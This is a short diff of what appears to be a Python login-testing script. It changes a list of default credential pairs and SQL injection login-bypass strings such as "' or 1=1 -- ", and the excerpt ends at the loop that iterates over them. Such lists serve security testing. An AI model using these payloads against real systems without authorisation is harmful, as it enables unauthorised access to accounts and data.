@@ -6,7 +6,7 @@ payloads = [
     ("admin", "admin"),
     ("admin", "admin_password"),
     ("admin' -- ", ""),
-    ("' OR '1'='1' or '1'='1", "")
+    ("' or 1=1 -- ", "")
 ]
 
 for username, password in payloads:
